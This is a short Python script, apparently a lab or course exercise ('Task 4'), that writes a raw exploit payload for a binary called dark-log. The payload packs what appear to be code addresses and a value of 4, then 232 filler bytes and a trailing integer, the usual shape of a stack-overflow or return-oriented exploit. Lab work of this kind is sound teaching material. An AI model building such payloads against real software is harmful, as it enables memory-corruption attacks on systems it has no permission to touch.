#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log."""
import sys

payload = b'\xa3\x18\x40\x00\x00\x00\x00\x00' \
           + b'\x04\x00\x00\x00\x00\x00\x00\x00' \
           + b'\x77\x16\x40\x00\x00\x00\x00\x00' \
           + b'A' * 232 \
           + b'\xc8\x00\x00\x00' \

sys.stdout.buffer.write(payload)
